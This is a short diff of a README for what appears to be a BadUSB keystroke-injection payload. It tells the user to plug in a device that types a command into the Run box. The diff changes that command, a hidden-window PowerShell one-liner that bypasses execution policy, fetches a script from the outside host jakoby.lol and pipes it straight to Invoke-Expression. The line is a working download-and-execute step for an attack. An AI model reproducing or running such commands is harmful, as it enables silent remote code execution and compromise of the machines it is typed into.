@@ -45,7 +45,7 @@ Each URL will be passed through the subscribe function.
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the dependencies and payload
 ```
-powershell -w h -NoP -NonI -Ep Bypass iwr jakoby.lol/14q | iex
+powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/14q | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
